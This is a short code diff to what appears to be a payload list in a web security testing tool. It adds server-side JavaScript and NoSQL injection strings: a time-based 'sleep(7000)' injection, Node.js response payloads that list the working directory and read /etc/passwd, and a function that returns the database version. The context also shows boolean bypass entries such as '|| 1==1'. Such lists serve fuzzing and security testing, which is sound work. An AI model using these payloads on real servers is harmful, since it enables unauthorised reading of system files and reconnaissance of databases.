@@ -1241,9 +1241,17 @@ NaN
 ==isNaN
 || 1==1
 || '1'=='1
+'; sleep(7000);'
 response.end('success')
 response.end(require('fs').readdirSync('.').toString())
 response.end(require('fs').readFileSync('/etc/passwd'))
+res.end('success')
+res.end(require('fs').readdirSync('.').toString())
+res.end(require('fs').readFileSync('/etc/passwd'))
+r.end('success')
+r.end(require('fs').readdirSync('.').toString())
+r.end(require('fs').readFileSync('/etc/passwd'))
+function() {val=db.version; return val;}
 """
 
 LDAP_INJECTION_PAYLOADS = """\
